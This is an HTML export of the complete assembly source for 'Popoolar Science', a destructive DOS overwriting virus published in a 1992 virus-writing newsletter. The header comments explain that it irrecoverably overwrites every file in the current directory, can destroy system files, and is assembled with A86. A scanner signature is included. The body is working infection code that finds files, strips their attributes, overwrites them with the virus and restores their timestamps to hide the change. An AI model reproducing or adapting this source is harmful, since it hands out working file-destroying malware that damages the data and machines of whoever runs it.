<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Popoolar Science virus - a very simple overwriting infector</span><span class="sc0">
</span><span class="sc1">;published in Crypt Newsletter 11, Dec. 1992. Edited by Urnst Kouch</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Popoolar Science is an indiscriminate, primitive over-writing</span><span class="sc0">
</span><span class="sc1">;virus which will attack all files in the current directory.</span><span class="sc0">
</span><span class="sc1">;Data overwritten by the virus is unrecoverable. Programs overwritten</span><span class="sc0">
</span><span class="sc1">;by Popoolar Science are infectious if their size does not exceed the</span><span class="sc0">
</span><span class="sc1">;64k boundary for .COM programs. .EXE's larger than this will not</span><span class="sc0">
</span><span class="sc1">;spread the virus; DOS will issue an "out of memory" message when the</span><span class="sc0">
</span><span class="sc1">;ruined program is loaded. Ruined programs of any type can only be erased</span><span class="sc0">
</span><span class="sc1">;from the disk to curb infection.  </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;If Popoolar Science is called into the root directory, the system files</span><span class="sc0">
</span><span class="sc1">;will be destroyed, resulting in a machine hang on start-up.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Popoolar Science does not look for a ident-marker in infected files - it </span><span class="sc0">
</span><span class="sc1">;merely overwrites all files in the current directory repeatedly. Indeed,</span><span class="sc0">
</span><span class="sc1">;there seems no need for a self-recognition routine in such a simple </span><span class="sc0">
</span><span class="sc1">;program of limited aims. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Popoolar Science will assemble directly to a .COMfile using Isaacson's</span><span class="sc0">
</span><span class="sc1">;A86 assembler. Use of a MASM/TASM compatible assembler will require</span><span class="sc0">
</span><span class="sc1">;addition of a set of declarative statements.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Virus signature suitable for loading into VIRSCAN.DAT files of TBScan,</span><span class="sc0">
</span><span class="sc1">;McAfee's SCAN and/or F-PROT 2.0x:</span><span class="sc0">
</span><span class="sc1">;[POP]</span><span class="sc0">
</span><span class="sc1">;DE B8 01 43 33 C9 8D 54 1E CD 21 B8 02 3D CD 21    </span><span class="sc0">

</span><span class="sc5">nosewheel</span><span class="sc4">:</span><span class="sc0">


        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">virubegin</span><span class="sc0">              </span><span class="sc1">; get going</span><span class="sc0">

</span><span class="sc5">virubegin</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc0">           
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                 </span><span class="sc1">; Display subscription </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">; endorsement for Popular</span><span class="sc0">
                           </span><span class="sc1">; Science magazine.</span><span class="sc0">

       
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_mask</span><span class="sc0">     </span><span class="sc1">; load filemask for "*.*"</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_n_infect</span><span class="sc0">          </span><span class="sc1">; infect a file, no need for</span><span class="sc0">
                        </span><span class="sc1">; an error routine - if no</span><span class="sc0">
                        </span><span class="sc1">; files found, virus will</span><span class="sc0">
                        </span><span class="sc1">; rewrite itself.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04C00h</span><span class="sc0">               </span><span class="sc1">; exit to DOS </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">


</span><span class="sc5">find_n_infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">                      

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02Fh</span><span class="sc0">                 </span><span class="sc1">; get DTA </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; Save old DTA </span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                   </span><span class="sc1">; BP points to local buffer</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">128</span><span class="sc0">                  </span><span class="sc1">; Allocate 128 bytes on stack</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; Save filemask</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01Ah</span><span class="sc0">                 </span><span class="sc1">; DOS set DTA function</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; DX points to buffer</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04Eh</span><span class="sc0">                 </span><span class="sc1">; search for first host file </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100111b</span><span class="sc0">            </span><span class="sc1">; CX holds all attributes</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; Restore file mask</span><span class="sc0">
</span><span class="sc5">findfilez</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">reset</span><span class="sc0">               </span><span class="sc1">; reset DTA and get ready to exit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write2file</span><span class="sc0">              </span><span class="sc1">; Infect file!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04Fh</span><span class="sc0">                  
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">findfilez</span><span class="sc0">         </span><span class="sc1">; find another host file</span><span class="sc0">

</span><span class="sc5">reset</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                   
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01Ah</span><span class="sc0">                 
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; Retrieve old DTA address</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                      
        </span><span class="sc6">ret</span><span class="sc0">                              


</span><span class="sc5">write2file</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; subroutine, writes virus over beginning of all files</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02Fh</span><span class="sc0">                 </span><span class="sc1">; DOS get DTA address function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04301h</span><span class="sc0">               </span><span class="sc1">; set file attributes</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01Eh</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; DX points to target handle</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03D02h</span><span class="sc0">               </span><span class="sc1">; open file, read/write</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">                    </span><span class="sc1">; do it!</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; put handle in BX</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">            </span><span class="sc1">; write to file, start at beginning </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">tailhook</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">nosewheel</span><span class="sc0">  </span><span class="sc1">; CX = virus length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nosewheel</span><span class="sc0">     </span><span class="sc1">; DX points to start of virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">                    </span><span class="sc1">; do it now!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05701h</span><span class="sc0">               
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">016h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; CX holds old file time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">018h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; DX holds old file date</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">                    </span><span class="sc1">; restore them</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">; close file </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">021h</span><span class="sc0">


</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">; exit, dummeh!</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                              

</span><span class="sc5">file_mask</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Filemask for all files</span><span class="sc0">
</span><span class="sc5">msg</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'PopooLar ScIencE RoolZ!$'</span><span class="sc0">  </span><span class="sc1">;Popular Science mag message</span><span class="sc0">

</span><span class="sc5">tailhook</span><span class="sc4">:</span><span class="sc0">

</span></div></body>
</html>
